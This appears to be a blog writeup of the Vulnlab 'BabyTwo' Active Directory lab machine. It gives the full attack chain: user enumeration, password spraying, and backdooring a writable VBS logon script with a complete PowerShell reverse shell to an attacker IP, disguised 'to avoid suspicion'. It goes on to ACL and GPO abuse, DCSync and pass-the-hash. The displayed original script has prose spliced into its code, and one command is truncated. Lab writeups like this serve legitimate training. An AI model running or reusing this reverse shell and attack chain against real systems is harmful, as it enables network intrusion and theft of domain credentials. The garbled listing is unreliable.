---
title: VL BabyTwo
published: 2025-10-25
description: BabyTwo is the continuation of the Baby Machine, it's a Windows Active Directory Medium Machine from Vulnlab, we will learn Password-Spraying | Hijacking a login script | BloodHound enumeration | Abusing some ACLs  & GPOs | DCSync...
image: 'https://assets.vulnlab.com/baby2_slide.png'
tags: [Active Directory, Medium, Vulnlab,]
category: Writeup
draft: false
---

Today we are doing the continuation of the Baby (Easy) machine on VulnLab, BabyTwo. This machine will cover  Password-Spraying  | Hijacking a login script | `BloodHound` enumeration | Abusing some `ACLs`  & `GPOs` | `DCSync`...

# Reconnaissance

As always we start off with our TCP scan using `nmap`&#x20;

```bash
nmap -p- --open -Pn -n --min-rate 5000 -sS -sCV 10.129.234.72 -oN scan
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-25 08:03:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56588/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56589/tcp open  msrpc         Microsoft Windows RPC
56606/tcp open  msrpc         Microsoft Windows RPC
62184/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-25T08:04:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 25 09:05:27 2025 -- 1 IP address (1 host up) scanned in 122.63 seconds
```

As we can see we're probably facing a `DC` (Domain Controller) because all of the simultaneously open ports: `TCP Port 88 (Kerberos)` | `TCP Port 135 (RPC)` | `TCP Port 5985 (WinRM)`...

At the same time let's enumerate the domain using `netexec`&#x20;

```bash
nxc smb 10.129.234.72
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
```

We add the shown domain to our `/etc/hosts` file&#x20;

Let's enumerate `TCP 53 (DNS)` to check **DNS records** as well using `dig`&#x20;

```
dig @10.129.234.72 baby2.vl NS
baby2.vl.		3600	IN	NS	dc.baby2.vl.
```

We see the Fully Qualified Domain Name there also as `dc.baby2.vl` so we add it to our `/etc/hosts` as we did earlier with `baby2.vl`&#x20;

Now let's climb up some *ports* and head to `TCP 88 (Kerberos)` and let's try to brute-force usernames using the `Kerbrute` tool

```bash
kerbrute userenum --dc 10.129.234.72 -d baby2.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/25/25 - Ronnie Flathers @ropnop

2025/10/25 10:25:31 >  Using KDC(s):
2025/10/25 10:25:31 >  	10.129.234.72:88

2025/10/25 10:25:33 >  [+] VALID USERNAME:	guest@baby2.vl
2025/10/25 10:25:39 >  [+] VALID USERNAME:	administrator@baby2.vl
2025/10/25 10:25:54 >  [+] VALID USERNAME:	library@baby2.vl
```

Great! we see that guest, administrator & library are available usernames on the `DC`&#x20;

Now it's time to check `TCP 135 (RPC)` using `rpcclient`, if there's success we can see users, groups and so on

```bash
❯ rpcclient -U '' -N baby2.vl
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> ^C
❯ rpcclient -U 'guest' -N baby2.vl
eCannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

However our access is denied, neither as `NULL` or as `guest` we get access to interacting with the `RPC` service &#x20;

Before enumerating more, let's sync our time with the `DC` using `faketime` & `ntpdate`&#x20;

```bash
faketime -f "+$(ntpdate -q baby2.vl 2>/dev/null | grep -oP 'offset \+\K[0-9.]+' | head -1)s" zsh
```

As we're enumerating each `TCP` port in a ascendant way, let's move onto the following `TCP 389 (LDAP)` using `netexec`&#x20;

```bash
nxc ldap baby2.vl -u 'guest' -p '' --users
LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.129.234.72   389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D10, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.129.234.72   389    DC               [+] baby2.vl\guest: 
LDAP        10.129.234.72   389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D10, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

But again, we don't have any possibility to enumerate

Now let's move to `TCP 445 (SMB)` using `netexec` hopefully this time it will give us results

```bash
nxc smb baby2.vl -u 'guest' -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
```

Success! We get  access to some shares, there are two interesting non-standard shares: *apps* & *homes* as well as the `WRITE` permission on the *homes* share, beforehand let's enumerate more valid users using the `--rid-brute` parameter on `netexec`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FIKVJRA4XbbyFEf5O3gzO%2Fimage.png?alt=media&#x26;token=2b4c2bfb-f47e-41cc-b5c8-18e1f0bb52aa" alt=""><figcaption></figcaption></figure>

We get plenty users so let's add  them to our `users.txt` file&#x20;

To enumerate these shares let's use the `spider_plus` `netexec` module which will crawl over all shares and output us files that were found on a `json` file

```bash
nxc smb baby2.vl -u 'guest' -p '' -M spider_plus
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FHOPbTpIfh2eicUUAxmVW%2Fimage.png?alt=media&#x26;token=4ffdc6bc-d3ab-4224-a7e0-faa0a4772a9a" alt=""><figcaption></figcaption></figure>

We got access to two files, one is a symbolic link to `login.vbs` and the other one is a `CHANGELOG` file

Let's download the `CHANGELOG` file using `netexec` again

```bash
netexec smb baby2.vl -u 'Guest' -p '' --get-file dev/CHANGELOG CHANGELOG --share apps
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FShpvxVL7lpjC5lDaPeV4%2Fimage.png?alt=media&#x26;token=49442ff5-51d9-441b-9f82-6f92911623d0" alt=""><figcaption></figcaption></figure>

This is human-written, so we will consider it as a hint for the next steps.

# AS-REP Roasting (Failed)

As we got a valid list of usernames but no passwords, `let's try a AS-REP Roasting` attack using impacket-GetNPUsers

:::note
AS-REP Roasting is a credential-dumping attack targeting Active Directory by exploiting accounts with “Do not require Kerberos preauthentication
:::

```bash
impacket-GetNPUsers baby2.vl/ -no-pass -usersfile users.txt -format john
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FRjer1Mnv7YqpxKYLQinj%2Fimage.png?alt=media&#x26;token=d244e30c-4ece-4016-81b9-a6c9bc21c617" alt=""><figcaption></figcaption></figure>

As there's no success, let's try a `Pasword Spraying Attack`&#x20;

# Password Spraying

Let's use `netexec` to password spray each user using users as passwords

```bash
netexec smb baby2.vl -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FQFrVwddMbF7wGFfiic63%2Fimage.png?alt=media&#x26;token=c4f321f9-1367-49fa-be68-1bd531411f10" alt=""><figcaption></figcaption></figure>

Success! We get two hits as valid credentials, one as `Carl.Moore:Carl.Moore` and the other as `library:library`.&#x20;

:::warning
This is a really **critical** security concern and shouldn't be happening
:::

Now we will enumerate if we got any new share access abusing these users

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F0ePcriEqngAbbDXno3XI%2Fimage.png?alt=media&#x26;token=2530b016-676a-4e0e-8876-0eb4b715fe57" alt=""><figcaption></figcaption></figure>

We see that now we've got access  to two more shares: `SYSVOL` & `apps` , let's replicate our earlier attack using the `spider_plus` module to check any interesting files on the accessible **shares**&#x20;

```bash
netexec smb baby2.vl -u 'library' -p 'library' -M spider_plus
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FHhVzoDKAylJUh1vdi2Ry%2Fimage.png?alt=media&#x26;token=159b1f10-cae4-4fe4-9dfd-8ce6c6c979bb" alt=""><figcaption></figcaption></figure>

The files discovered by the *share crawl* show a file that stands out: `baby2.vl/scripts/login.vbs`&#x20;

# Foothold: Hijacking login script

Remember the symbolic link we found earlier along with the `CHANGELOG` that indicated a possible login script

We now have access to see what this login script actually does, so let's download it using `netexec` &#x20;

```bash
netexec smb baby2.vl -u 'Guest' -p '' --get-file baby2.vl/scripts/login.vbs login.vbs --share SYSVOL
```

```powershell
Sub MapNetworkShare(sharePath, driveLetter)
This script is a logon script for users and it maps network shares. This means that it will be executed every
time a user logs in. Since we have write access to this share, we can embed a malicious reverse shell inside
this file so that when a user logs in, it will be executed and give us a shell.
First, head to revshells.com and create a base64-encoded PowerShell reverse shell.
Dim objNetwork
Set objNetwork = CreateObject("WScript.Network")
' Check if the drive is already mapped
Dim mappedDrives
Set mappedDrives = objNetwork.EnumNetworkDrives
Dim isMapped
isMapped = False
For i = 0 To mappedDrives.Count - 1 Step 2
If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
isMapped = True
Exit For
End If
Next
If isMapped Then
objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
End If
objNetwork.MapNetworkDrive driveLetter & ":", sharePath
If Err.Number = 0 Then
WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
Else
WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
End If
Set objNetwork = Nothing
End Sub
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

This login script is executed every time a user signs in and its purpose is to map network shares for that user. Let's check if we've got write access to this folder using `smbclient` and putting a test file (`users.txt`) :

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FFQO7SapGg4cfJK1yqYLX%2Fimage.png?alt=media&#x26;token=569c03ea-7f3c-414d-9766-2f20b453f969" alt=""><figcaption></figcaption></figure>

Nice, we've got write access which means that we can manipulate the login.vbs file keep in mind that any change to that file will be executed in the context of whoever logs in.&#x20;

Let's modify the file like this to establish a reverse shell to our attacker system:

```powershell
Sub ReverseShell()
    Dim ws
    Set ws = CreateObject("WScript.Shell")
    
    ' PowerShell reverse shell one-liner
    Dim psCommand
    psCommand = "powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('10.10.14.33',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    
    ws.Run psCommand, 0, False
    Set ws = Nothing
End Sub

' Call the reverse shell function
ReverseShell

' Keep the original mapping function to avoid suspicion
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
    
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
```

and then put  it using the `put` command in `smbclient`&#x20;

Now let's set up our listener

```bash
rlwrap nc -lvnp 443
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FCBZh1pl7T4MiRiGr8WEX%2Fimage.png?alt=media&#x26;token=c67d22c2-01e4-4f15-98bc-816f1d8e1a3d" alt=""><figcaption></figcaption></figure>

We finally got our *foothold* onto the system as `amelia.griffiths`!&#x20;

For escalating our privileges let's use `bloodhound` with the `library:library` credentials which have access to `LDAP` along with our data collector, we will use `rusthound` in this case.

:::note
**RustHound** is a **cross-platform** **BloodHound** collector tool written in *Rust*, making it compatible with *Linux*, *Windows*, and *macOS*. 
No **AV** detection and **cross-compiled.** 
**RustHound** generates users, groups, computers, **OUs**, **GPOs**, containers, and domain **JSON** files that can be analyzed with **BloodHound**.
:::

```bash
rusthound -d baby2.vl -i "10.129.234.72" -u 'library@baby2.vl' -p 'library' -z --adcs --old-bloodhound
```

# Privilege Escalation using Bloodhound

Now let's ingest it into our `Bloodhound`

```bash
sudo bloodhound
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FQASF4kIZrFed8uUVqtAA%2Fimage.png?alt=media&#x26;token=551fdd26-7ff0-49cf-8234-3285ce1d2e82" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FEHL0ioNGVJxniBvP6tgM%2Fimage.png?alt=media&#x26;token=48b3036e-7a2a-495d-bb1a-f1a2b3089227" alt=""><figcaption></figcaption></figure>

We now visualize that the current user `AMELIA.GRIFFITHS` has `WriteDacl` & `WriteOwner` over `GPOADM` which means if we read the `BloodHound` documentation about this,we see that we can give us the `GenericAll` right over  `GPOADM`, hence changing this user's password without knowing our current password, this is exactly our desired situation so let's abuse this!

# Abusing  WriteOwner & WriteDacl over GPOADM

First let's give us `GenericAll` over the `GPOADM` user using `PowerView.ps1` &#x20;

:::note
`PowerView` Is *a reconnaissance tool* which you one can use after an initial foothold is gained. You can get the `PowerView.ps1` script from `GitHub` <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>
:::

To use `PowerView` first we need to import it

```
. .\PowerView.ps1
```

And now we can give the `LEGACY` group we are in that has the permissions to grant `GenericAll` over `GPOADM`&#x20;

```bash
Add-DomainObjectAcl -PrincipalIdentity "legacy" -TargetIdentity "gpoadm" -Rights All -Verbose
```

This gave us permission to change the `GPOADM's` password to something else using `net.exe` , let's put `Password123!`  as the new password

:::warning
Keep in mind that **net.exe** is not stealth at all and gives obvious traces to mark it as a security concerns, so in real life *Red Teaming* / *Pentesting* you shouldn't use it
:::

```powershell
net user "gpoadm" Password123!
```

As we can see in `netexec` We successfully changed the user's password

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FD3dlCc9TfdiAVNXuCDIg%2Fimage.png?alt=media&#x26;token=5d87109e-5124-48c6-b991-7e21148386de" alt=""><figcaption></figcaption></figure>

Now let's enumerate the *outbound object control* of this user using `bloodhound` like we did with `AMELIA.GRIFFITH`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FSQb6qLXrFFzH3V8IwDmw%2Fimage.png?alt=media&#x26;token=f8132c2c-188a-4b01-b198-f2f68692ed55" alt=""><figcaption></figcaption></figure>

There's an interesting `GenericAll` permission over a Tier 0 GPO

:::note
**Tier 0 GPOs** are Group Policy Objects that can affect **Tier 0 assets** - the most privileged accounts and systems in an Active Directory environment.
:::

We can use [pyyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) in order to abuse this right

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F8oNvm6cCV8jkPSSQq6E7%2Fimage.png?alt=media&#x26;token=e3f6e262-9c05-45f1-9bb9-078f1dd83e28" alt=""><figcaption></figcaption></figure>

Let's try to execute a  command that  adds the `GPOADM` user into the *administrators* group, to do this we need to collect the `GPO id`, we can find that using `BloodHound`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FYTDDcC4U0kc4P9eZOeAR%2Fimage.png?alt=media&#x26;token=444d65e8-59ee-4f85-8bb2-89c9e755a912" alt=""><figcaption></figcaption></figure>

And now crafting our command which will add us to the administrators local group with the following command `net localgroup administrators gpoadm /add`&#x20;

```bash
python3 pyGPOAbuse/pygpoabuse.py baby2.vl/gpoadm:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators gpoadm /add'
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F88oLMu4qN6dqNePuUKs7%2Fimage.png?alt=media&#x26;token=8b6b1f6d-e78a-4ccb-9635-9d5c08c809f1" alt=""><figcaption></figcaption></figure>

# DCSync  using impacket

Now we've got the right to perform a `DCSync` attack which will retrieve all hashes for the domain users, let's use `impacket-secretsdump` for this

```bash
baby2.vl/gpoadm:'Password123!'@10.129.234.72
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Feyc8okcX5kqR6mmQXqqW%2Fimage.png?alt=media&#x26;token=a69bee59-9b7e-4776-91f9-6a43c9372a6d" alt=""><figcaption></figcaption></figure>

Perfect! Now let's just `PtH` to the `WinRM Service` using `evil-winrm` to the **DC** throughout  the *Administrator* account

```bash
evil-winrm -i baby2.vl -u 'administrator' -H '61eb5125f9944214679c2d0fdca6eb82'
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FXlz41hrvRC6dUpsP0To5%2Fimage.png?alt=media&#x26;token=65db706a-64b7-4341-89f8-62555a5f2635" alt=""><figcaption></figcaption></figure>

Hope you enjoyed this machine and see you next time!
